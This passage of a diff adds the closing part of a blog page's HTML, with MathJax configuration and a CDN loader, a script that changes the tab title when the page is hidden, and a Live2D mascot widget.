+            inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+            processEscapes: true,
+            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+        }
+    });
+</script>
+
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for (i=0; i < all.length; i += 1) {
+            all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+    });
+</script>
+
+<script type="text/javascript" src="//cdn.bootcss.com/mathjax/2.7.1/latest.js?config=TeX-AMS-MML_HTMLorMML"></script>
+
+
+
+
+    <script>
+    (function() {
+        var OriginTitile = document.title, titleTime;
+        document.addEventListener('visibilitychange', function() {
+            if (document.hidden) {
+                document.title = '等你回来呀~';
+                clearTimeout(titleTime);
+            } else {
+                document.title = '(つェ⊂)欢迎回来!';
+                titleTime = setTimeout(function() {
+                    document.title = OriginTitile;
+                },2000);
+            }
+        });
+    })();
+</script>
+
+
+
+
+
+    
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/assets/tororo.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":false},"log":false});</script></body>
+</html>
